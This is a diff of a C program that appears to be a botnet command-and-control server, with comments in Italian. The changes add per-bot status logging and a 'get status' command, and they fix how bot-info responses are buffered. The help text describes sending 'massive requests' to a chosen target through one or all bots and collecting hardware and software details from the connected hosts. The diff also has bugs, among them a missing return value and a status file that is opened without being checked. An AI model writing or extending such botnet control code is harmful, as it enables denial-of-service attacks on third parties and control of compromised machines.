@@ -11,6 +11,7 @@
 #define CHECK_ACTIVE_BOT_TIMEOUT 500L
 
 const char *bot_list_file_name = "botnet.txt";
+const char *status_file_name = "status.log";
 
 void handle_get_request(int client_socket);
 
@@ -36,6 +37,7 @@ void get_bot_info_request(const char *ip, const char *port);
 
 size_t write_callback_get_bot_info_request(void *contents, size_t size, size_t nmemb, void *userp);
 
+int get_index(const char *targetHost, const char *targetPort);
 
 void print_page_and_wait(const char *text);
 
@@ -43,13 +45,22 @@ int send_request(char *host, char *port, char *targetHost, char *targetPort, int
 
 int send_requests_through_bots(char *host, char *port, int index);
 
+int write_status(int index, const char *host, const char *port, char *status);
+
+void print_status(int botId);
+
 // Definizione di una struttura per passare i parametri al thread
 struct ThreadArgs {
     char *targetHost;
     char *targetPort;
     char *client;
 };
-
+//Gestione della risposta json di get info
+struct MemoryStruct {
+    char *memory;
+    size_t size;
+};
+//main method
 int main(int argc, char *argv[]) {
     if (argc != 2) {
         fprintf(stderr, "Usage: %s <port>\n", argv[0]);
@@ -77,7 +88,7 @@ int main(int argc, char *argv[]) {
         // list command
         if (strcmp(command, "help\n") == 0) {
             // Eseguire un'azione di uscita o terminare il server
-            printf("\na) botnet\n get the list of ip and ports of active bots with specific target id.\n\nb) requests {hostname} {port} {target}\n Send a massive requests to a specified target with specific port through one or more bots.\n Use wildcard * to send request from all botnet.\n Examples:\n  $ requests localhost 5000 *\n  $ requests localhost 5000 1\n\nc) get info {botId}\n Receive hardware and software information about hosts connected to this botnet.\n Example:\n  $ get info 1\n\nd) get status\n Get current status of bots\n\n");
+            printf("\na) botnet\n get the list of ip and ports of active bots with specific target id.\n\nb) requests {hostname} {port} {target}\n Send a massive requests to a specified target with specific port through one or more bots.\n Use wildcard * to send request from all botnet.\n Examples:\n  $ requests localhost 5000 *\n  $ requests localhost 5000 1\n\nc) get info {botId}\n Receive hardware and software information about hosts connected to this botnet.\n Example:\n  $ get info 1\n\nd) get status {botId}\n Get current status of bots.\n Example:\n  $ get status 1\n\n\n\n");
         }
             // botnet command
         else if (strcmp(command, "botnet\n") == 0) {
@@ -101,8 +112,10 @@ int main(int argc, char *argv[]) {
             get_bot_info(bot_id);
         }
             // get status command
-        else if (strcmp(command, "get status\n") == 0) {
-            printf("get status!\n\n");
+        else if (strncmp(command, "get status ", 11) == 0) {
+            int bot_id = atoi(command + 11); // Estrai l'argomento numerico dopo "get info "
+            update_bot_list();
+            print_status(bot_id);
             // requests command
         } else if (strncmp(command, "requests", 8) == 0) {
             char targetHost[256];
@@ -218,46 +231,7 @@ int send_request(char *host, char *port, char *targetHost, char *targetPort, int
         res = curl_easy_perform(curl);
 
         if (res == CURLE_OK) {
-            FILE *file = fopen("status.log", "a+"); // Apri il file in modalità append/lettura
-
-            if (file == NULL) {
-                perror("Errore nell'apertura del file");
-                return 1;
-            }
-
-            // Calcola il timestamp
-            time_t t = time(NULL);
-            struct tm *tm_info = localtime(&t);
-            char timestamp[20];
-            strftime(timestamp, 20, "%Y%m%d-%H%M", tm_info);
-
-            char line[200]; // Supponiamo che ogni riga del file abbia meno di 100 caratteri
-
-            // Crea la riga con il formato richiesto
-            snprintf(line, sizeof(line), "%d|%s|%s|255%s|%s\n", index, host, port, status, timestamp);
-
-            // Cerca se esiste già una riga con lo stesso indice
-            char temp[100];
-            char *found = NULL;
-
-            while (fgets(temp, sizeof(temp), file)) {
-                int current_index;
-                if (sscanf(temp, "%d|", &current_index) == 1 && current_index == index) {
-                    found = temp;
-                    break;
-                }
-            }
-
-            if (found != NULL) {
-                // Sovrascrivi la riga con le nuove informazioni
-                fseek(file, -(long)strlen(found), SEEK_CUR);
-                fputs(line, file);
-            } else {
-                // Scrivi una nuova riga
-                fputs(line, file);
-            }
-
-            fclose(file);
+            write_status(index, host, port, status);
         } else {
             printf("Error in the request: %s\n", curl_easy_strerror(res));
             return 1;
@@ -266,6 +240,49 @@ int send_request(char *host, char *port, char *targetHost, char *targetPort, int
         json_object_put(request_json);
     }
     return 0;
+}
+
+int write_status(int index, const char *host, const char *port, char *status) {
+    FILE *file = fopen(status_file_name, "a+"); // Apri il file in modalità append/lettura
+
+    if (file == NULL) {
+        perror("Errore nell'apertura del file");
+        return 1;
+    }
+
+    // Calcola il timestamp
+    time_t t = time(NULL);
+    struct tm *tm_info = localtime(&t);
+    char timestamp[20];
+    strftime(timestamp, 20, "%Y%m%d-%H%M", tm_info);
+
+    char line[200]; // Supponiamo che ogni riga del file abbia meno di 100 caratteri
+
+    // Crea la riga con il formato richiesto
+    snprintf(line, sizeof(line), "%d|%s|%s|%s|%s\n", index, host, port, status, timestamp);
+
+    // Cerca se esiste già una riga con lo stesso indice
+    char temp[100];
+    char *found = NULL;
+
+    while (fgets(temp, sizeof(temp), file)) {
+        int current_index;
+        if (sscanf(temp, "%d|", &current_index) == 1 && current_index == index) {
+            found = temp;
+            break;
+        }
+    }
+
+    if (found != NULL) {
+        // Sovrascrivi la riga con le nuove informazioni
+        fseek(file, -(long) strlen(found), SEEK_CUR);
+        fputs(line, file);
+    } else {
+        // Scrivi una nuova riga
+        fputs(line, file);
+    }
+
+    fclose(file);
 }
 
 // Start server
@@ -354,7 +371,7 @@ void handle_post_request(int client_socket, const char *data) {
         send_response(client_socket, 400, "Bad Request", "Invalid JSON data");
         return;
     }
-
+    char port_str[10];
     struct json_object *clientIP_obj;
     struct json_object *ports_obj;
     struct json_object *targetIp_obj;
@@ -403,7 +420,7 @@ void handle_post_request(int client_socket, const char *data) {
             if (!is_duplicate) {
                 // La porta non è duplicata, quindi la aggiungiamo al set di porte processate
                 processed_ports[processed_count++] = port;
-
+                strcpy(port_str, port);
                 // Scrivi una nuova riga con l'indice progressivo
                 fprintf(file, "%d|%s|%s\n", index, clientIP, port);
                 added_count++;
@@ -412,17 +429,27 @@ void handle_post_request(int client_socket, const char *data) {
 
         fclose(file);
 
+        //aggiorno lo stato
+        char status[100];
+        snprintf(status, sizeof(status), "ready to command");
+        write_status(index, clientIP, port_str, status);
+
         // Invia una risposta di successo al client
         send_response(client_socket, 200, "OK", added_count > 0 ? "Data added successfully" : "No new data added");
     } else if (json_object_object_get_ex(json_obj, "targetIP", &targetIp_obj) &&
                json_object_object_get_ex(json_obj, "targetPort", &targetPort_obj) &&
                json_object_object_get_ex(json_obj, "clientIP", &clientIP_obj) &&
                json_object_object_get_ex(json_obj, "port", &clientPort_obj)) {
-        const char *targetIp = json_object_get_string(targetIp_obj);
+        const char *targetHost = json_object_get_string(targetIp_obj);
         const char *targetPort = json_object_get_string(targetPort_obj);
-        const char *clientIp = json_object_get_string(clientIP_obj);
+        const char *clientHost = json_object_get_string(clientIP_obj);
         const char *clientPort = json_object_get_string(clientPort_obj);
+        //scrivere lo stato
 
+        int index = get_index(clientHost, clientPort);
+        char status[100];
+        snprintf(status, sizeof(status), "finish send requests to %s and port %s", targetHost, targetPort);
+        write_status(index, clientHost, clientPort, status);
         send_response(client_socket, 200, "OK", "Message received");
     } else {
         send_response(client_socket, 400, "Bad Request", "Invalid JSON format");
@@ -556,7 +583,7 @@ char *get_formatted_server_info() {
         int field_count = 0;
         char *port_str = strtok(line, "|");
         while (port_str != NULL) {
-            if (field_count > 1) {
+            if (field_count == 2) {
                 if (sscanf(port_str, "%d", &port) == 1) {
                     if (server_info[strlen(server_info) - 1] != ':') {
                         strcat(server_info, " ");
@@ -627,15 +654,16 @@ void get_bot_info(int record_id) {
 
 // Funzione per eseguire una richiesta HTTP POST al server
 void get_bot_info_request(const char *ip, const char *port_str) {
-// Creazione dell'oggetto JSON per la richiesta
     struct json_object *request_json = json_object_new_object();
     json_object_object_add(request_json, "command", json_object_new_string("get info"));
     const char *request_data = json_object_to_json_string(request_json);
     int port = atoi(port_str);
     // Esegui la richiesta HTTP POST e ottieni la risposta
+    struct MemoryStruct chunk;
+    chunk.memory = malloc(1);  // Inizializza il buffer con un byte
+    chunk.size = 0;
     CURL *curl;
     CURLcode res;
-    char *response = NULL;
 
     curl = curl_easy_init();
     if (curl) {
@@ -645,7 +673,7 @@ void get_bot_info_request(const char *ip, const char *port_str) {
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_data);
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_get_bot_info_request);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
 
         res = curl_easy_perform(curl);
 
@@ -657,7 +685,7 @@ void get_bot_info_request(const char *ip, const char *port_str) {
         curl_easy_cleanup(curl);
         char info_str[40960];
         // Analizza la risposta JSON utilizzando json-c
-        struct json_object *json = json_tokener_parse(response);
+        struct json_object *json = json_tokener_parse(chunk.memory);
         if (json) {
             struct json_object *os_info, *cpu_info, *memory_info, *disk_info, *network_info;
             if (json_object_object_get_ex(json, "infoOS", &os_info) &&
@@ -681,24 +709,25 @@ void get_bot_info_request(const char *ip, const char *port_str) {
         } else {
             fprintf(stderr, "Errore nell'analisi del JSON\n");
         }
-
-        free(response);
+        free(chunk.memory);
     }
 }
 
-//write back for get_bot_info
+//write callback for get_bot_info
 size_t write_callback_get_bot_info_request(void *contents, size_t size, size_t nmemb, void *userp) {
     size_t realsize = size * nmemb;
-    char **response = (char **) userp;
+    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
 
-    *response = (char *) realloc(*response, realsize + 1);
-    if (*response == NULL) {
+    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
+    if (ptr == NULL) {
         fprintf(stderr, "Errore nell'allocazione della memoria\n");
         return 0;
     }
 
-    memcpy(*response, contents, realsize);
-    (*response)[realsize] = '\0';
+    mem->memory = ptr;
+    memcpy(&(mem->memory[mem->size]), contents, realsize);
+    mem->size += realsize;
+    mem->memory[mem->size] = '\0';
 
     return realsize;
 }
@@ -748,6 +777,33 @@ void print_page_and_wait(const char *text) {
     endwin();  // Termina ncurses
 }
 
+int get_index(const char *targetHost,const char *targetPort) {
+    FILE *file = fopen(bot_list_file_name, "r");
+    if (!file) {
+        return 1;
+    }
+
+    char line[1024];
+    int current_index = 0;
+    int result;
+    while (fgets(line, sizeof(line), file)) {
+        current_index++;
+        char *index = strtok(line, "|");
+        char *host = strtok(NULL, "|");
+        char *port = strtok(NULL, "|");
+        size_t newline_pos = strcspn(port, "\n");
+        if (port[newline_pos] == '\n') {
+            port[newline_pos] = '\0';
+        }
+        if (host && port && strcmp(host, targetHost) == 0 && strcmp(port, targetPort) == 0) {
+            fclose((file));
+            return current_index;
+        }
+    }
+    fclose((file));
+    return current_index;
+}
+
 int send_requests_through_bots(char *targetHost, char *targetPort, int index) {
     FILE *file = fopen(bot_list_file_name, "r");
     if (!file) {
@@ -778,3 +834,57 @@ int send_requests_through_bots(char *targetHost, char *targetPort, int index) {
     return 0;
 }
 
+void print_status(int botId) {
+    FILE *file = fopen(bot_list_file_name, "r");
+    if (file == NULL) {
+        return;
+    }
+    char line[1024];
+    char record_ip[256];
+    int port;
+    char *record_ports = NULL;
+    int count_id = 1;
+    while (fgets(line, sizeof(line), file)) {
+        if (count_id == botId) {
+            if (sscanf(line, "%*d|%255[^|]|", record_ip) != 1) {
+                // Formato di riga non valido, salta
+                continue;
+            }
+            int field_count = 0;
+            char *port_str = strtok(line, "|");
+            while (port_str != NULL) {
+                if (field_count == 2) {
+                    if (sscanf(port_str, "%d", &port) == 1) {
+                        port_str = strtok(NULL, "|");
+                        break;
+                    }
+                }
+                field_count++;
+                port_str = strtok(NULL, "|");
+            }
+        }
+        count_id++;
+    }
+    fclose(file);
+
+    FILE *statusFile = fopen(status_file_name, "r");
+    if (file == NULL) {
+        return;
+    }
+    while (fgets(line, sizeof(line), statusFile) != NULL) {
+        int id;
+        char status_ip[16];
+        int status_port;
+        char status[128];
+        char timestamp[16];
+
+        // Analizza i campi dalla riga
+        if (sscanf(line, "%d|%15[^|]|%d|%127[^|]|%15s", &id, status_ip, &status_port, status, timestamp) == 5) {
+            if (id == botId && strcmp(status_ip, record_ip) == 0 && port == status_port ) {
+                printf("Timestamp: %s, Status: %s\n", timestamp, status);
+            }
+        }
+    }
+
+    fclose(statusFile);
+}
